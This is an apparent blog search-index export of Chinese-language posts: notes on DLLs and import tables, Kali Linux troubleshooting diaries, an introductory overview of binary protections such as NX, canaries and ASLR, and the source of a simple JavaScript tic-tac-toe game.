=4400.</p><p>2.DLL（动态链接库）</p><p>不把库包含在程序中，而是单独组成DLL文件，需要时调用即可/更新库时只需要替换DLL文件即可/内存映射使加载后的DLL代码，资源在多个进程中实现共享。</p><p>Windows版本不同，环境不同，被调用函数的位置（地址）也不相同。</p><p>①为了确保在所有环境中都能正常调用被调用函数，编译器保存了被调用函数实际地址的位置。PE装载器将被调用函数的地址写到该位置。</p><p>②DLL重定位。DLL的ImageBase默认为1000000，若某个程序使用a.dll与b.dll时，a已被装载到内存的10000000处，PE装载器只能查找其他空白的内存空间，将b装载进去。</p><p>③PE头表示地址用RVA 而不是VA。</p><p>3.IAT（Import Address Table 导入地址表）：用来记录程序正在使用库中的哪些函数。</p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20180720</title>
      <link href="/2018/07/20/diary-20180720/"/>
      <url>/2018/07/20/diary-20180720/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>或许是因为复习时不怎么使用虚拟机，导致网络的某些配置出现了问题，按照网上的各种方法怎么也搞不好，历经小半天，终于解决。方法如下：</p><p>1.到根目录下/etc/network找到interfaces文件</p><p>2.</p><p>vi打开：<code>vi interfaces</code></p><p>此时发现，只有两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br></pre></td></tr></table></figure><p>之所以不能联网是因为这个文件不完整。</p><p>讲这两行替换为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line">auto eth2</span><br><span class="line">iface eth2 inet dhcp</span><br><span class="line">auto ath0</span><br><span class="line">iface ath0 inet dhcp</span><br><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br></pre></td></tr></table></figure><p>3.退出vi，启动项 <code>/etc/init.d/networking</code>，重启网络连接<code>sudo /etc/init.d/networking restart</code>，就ok了</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20180517</title>
      <link href="/2018/05/17/diary-20180517/"/>
      <url>/2018/05/17/diary-20180517/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环；</p><p>寻求各色解法，e.g. vi /etc/profile  但是其文件正常，之后终于在误打误撞中解决。</p><p>步骤：<br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="1" title="(1).png" class="">                <p>(1).png</p>            </figure><br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="2" title="(2).png" class="">                <p>(2).png</p>            </figure></p><p>进入 recovery mode（也就是纯命令行模式）</p><p>输入用户密码</p><p>按理说 应该继续 apt-get update -f</p><p>但会提示 输入 dpkg –configure -a</p><p>完成后重新update 就ok啦</p><p>2018-12-5 </p><p>试着换了几个其他版本的linux，结果都不太合心意，最后还是回去修复了有些问题的gdb，暂时放弃了pwndbg的安装<br>kali 设定开机自动运行sh脚本方式不太一样，记在这里：</p><p>Debian定义了多个运行级别脚本，分别存放在/etc/rc0.d至/etc/rc6.d中，默认级别为5.</p><p>要增加开机自动运行脚本的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/init.d/rc.local</span><br></pre></td></tr></table></figure><p>写入你需要运行的脚本，:wq退出，这里我将自己的脚本放到/usr/local/bin下，然后在rc.local下指定脚本路径：./usr/local/bin/automount，注意要给脚本执行权限，rc.local中也要加入点’ . ‘来执行脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/init.d/rc.local #增加脚本执行权限</span><br><span class="line"></span><br><span class="line">update-rc.d rc.local start 99 2 3 4 5 . stop 01 0 1 6 . #设置启动级别</span><br></pre></td></tr></table></figure><p>若要删除脚本的启动级别运行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d -f rc.local remove</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn0.0 --Protection technology</title>
      <link href="/2018/05/13/protection-technology/"/>
      <url>/2018/05/13/protection-technology/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="NX保护和DEP保护"><a href="#NX保护和DEP保护" class="headerlink" title="NX保护和DEP保护"></a>NX保护和DEP保护</h1><p>两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限</p><h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><p>NX保护，全称为 “No eXecute” ，意为 [禁止执行]<br>我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。</p><p>linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。</p><h2 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h2><p>DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护</p><p>数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码</p><p>主要优点<br>我觉得这种保护技术组要应用于Windows</p><p>这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。<br>百度百科上有这样一句话：</p><p>可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。</p><p>*P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。</p><h1 id="Linux-Canary保护"><a href="#Linux-Canary保护" class="headerlink" title="Linux Canary保护"></a>Linux Canary保护</h1><p>Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：<br>溢出栈缓冲区<br>劫持方式</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/1.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。<br>然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下：</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/2.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。</p><p>注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。</p><h1 id="ASLR地址空间布局随机化"><a href="#ASLR地址空间布局随机化" class="headerlink" title="ASLR地址空间布局随机化"></a>ASLR地址空间布局随机化</h1><p>ASLR ，全称为 Address space layout randomization<br>顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p><p>但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。</p><p>关于这个，多的我也说不上来，给几个文章的地址吧。</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE ，全称为 position-independent executables<br>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。</p><p>内存地址随机化机制，有以下三种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数 意义</span><br><span class="line">0 表示关闭进程地址空间随机化</span><br><span class="line">1 表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line">2 表示在1的基础上增加栈（heap）的随机化</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br><em>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</em></p><h1 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h1><p>这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。</p><p>系统防护（全）：<br><a href="http://www.mamicode.com/info-detail-1990426.html" title="1" target="_blank" rel="noopener">二进制的保护机制</a><br><a href="https://blog.csdn.net/x_nirvana/article/details/61420056" title="2" target="_blank" rel="noopener">WINDOWS和LINUX的内存防护机制</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JavaScript Naughts and Crosses</title>
      <link href="/2018/01/24/javascript-naughts-and-crosses/"/>
      <url>/2018/01/24/javascript-naughts-and-crosses/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><p>学习html,js,css一周做了个粗糙的人机井字棋，虽然很丑，但是有彩蛋啊，比如说：黑白图片来自我c语言课设那刷屏的烫烫烫hhh。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;澳门皇家赌场&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">h1&#123;color:blue;&#125;</span><br><span class="line">table&#123;background-color:rgb(182,194,154);</span><br><span class="line">width:450px;</span><br><span class="line">height:450px;&#125;</span><br><span class="line">body&#123;background-color:rgb(131,175,155);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;</span><br><span class="line">alert(&quot;欢迎来到棋牌室！&quot;);</span><br><span class="line">var a=new Array(10)</span><br><span class="line">for(var i=0;i&lt;9;i++)</span><br><span class="line">a[i]=0;</span><br><span class="line"></span><br><span class="line">function start()</span><br><span class="line">&#123;</span><br><span class="line">for(var i=0;i&lt;9;i++)</span><br><span class="line">&#123; a[i]=0;</span><br><span class="line">document.getElementById(&quot;srci&quot;+String(i)).src=&quot;back.png&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">coun=0;</span><br><span class="line"></span><br><span class="line">function restart()</span><br><span class="line">&#123;</span><br><span class="line">window.location.reload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function img_change(id)</span><br><span class="line">&#123;</span><br><span class="line">var x=1;</span><br><span class="line">while(x==1)&#123;</span><br><span class="line">if(id==&quot;div0&quot;&amp;&amp;a[0]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[0]=1;</span><br><span class="line">document.getElementById(&quot;srci0&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div1&quot;&amp;&amp;a[1]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[1]=1;</span><br><span class="line">document.getElementById(&quot;srci1&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div2&quot;&amp;&amp;a[2]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[2]=1;</span><br><span class="line">document.getElementById(&quot;srci2&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div3&quot;&amp;&amp;a[3]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[3]=1;</span><br><span class="line">document.getElementById(&quot;srci3&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div4&quot;&amp;&amp;a[4]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[4]=1;</span><br><span class="line">document.getElementById(&quot;srci4&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div5&quot;&amp;&amp;a[5]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[5]=1;</span><br><span class="line">document.getElementById(&quot;srci5&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div6&quot;&amp;&amp;a[6]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[6]=1;</span><br><span class="line">document.getElementById(&quot;srci6&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div7&quot;&amp;&amp;a[7]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[7]=1;</span><br><span class="line">document.getElementById(&quot;srci7&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div8&quot;&amp;&amp;a[8]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[8]=1;</span><br><span class="line">document.getElementById(&quot;srci8&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!(winner()))&#123;</span><br><span class="line">coun++;</span><br><span class="line">Robots_Time();&#125;</span><br><span class="line"></span><br><span class="line">if(!(winner())&amp;&amp;coun==9)</span><br><span class="line">alert(&quot;draw&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function Robots_Time()</span><br><span class="line">&#123;</span><br><span class="line">var z=1;</span><br><span class="line">while(z==1)&#123;</span><br><span class="line">var ran=Math.random()*9;</span><br><span class="line">ran=parseInt(ran);</span><br><span class="line">if(a[ran]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[ran]=2;</span><br><span class="line">document.getElementById(&quot;srci&quot;+String(ran)).src=&quot;white.png&quot;;</span><br><span class="line">coun++;</span><br><span class="line">z=0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">winner();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function winner()&#123;</span><br><span class="line">if(a[0]==2&amp;&amp;a[1]==2&amp;&amp;a[2]==2||a[0]==2&amp;&amp;a[4]==2&amp;&amp;a[8]==2||a[0]==2&amp;&amp;a[3]==2&amp;&amp;a[6]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[1]==2&amp;&amp;a[4]==2&amp;&amp;a[7]==2||a[2]==2&amp;&amp;a[5]==2&amp;&amp;a[8]==2||a[3]==2&amp;&amp;a[4]==2&amp;&amp;a[5]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[2]==2&amp;&amp;a[4]==2&amp;&amp;a[6]==2||a[6]==2&amp;&amp;a[7]==2&amp;&amp;a[8]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line"></span><br><span class="line">if(a[0]==1&amp;&amp;a[1]==1&amp;&amp;a[2]==1||a[0]==1&amp;&amp;a[4]==1&amp;&amp;a[8]==1||a[0]==1&amp;&amp;a[3]==1&amp;&amp;a[6]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[1]==1&amp;&amp;a[4]==1&amp;&amp;a[7]==1||a[2]==1&amp;&amp;a[5]==1&amp;&amp;a[8]==1||a[3]==1&amp;&amp;a[4]==1&amp;&amp;a[5]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[2]==1&amp;&amp;a[4]==1&amp;&amp;a[6]==1||a[6]==1&amp;&amp;a[7]==1&amp;&amp;a[8]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=&quot;1&quot;</span><br><span class="line">cellpadding=&quot;1&quot;</span><br><span class="line">cellspacing=&quot;1&quot;</span><br><span class="line">align=&quot;center&quot;&gt;</span><br><span class="line">&lt;caption&gt;Play with NPC&lt;audio loop=&quot;loop&quot; autoplay=&quot;autoplay/&quot;&gt;</span><br><span class="line">&lt;source src=&quot;I Need To Be In Love.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/caption&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div0&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci0&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div1&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci1&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div2&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci2&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div3&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci3&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div4&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci4&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div5&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci5&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div6&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci6&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div7&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci7&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div8&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci8&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;center&gt;&lt;button onclick=&quot;restart()&quot;&gt;重新开始&lt;/button&gt;&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>附地址：<a href="http://139.59.232.52/game.html" target="_blank" rel="noopener">点击与愚蠢的电脑过招井字棋，输了算你牛</a></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
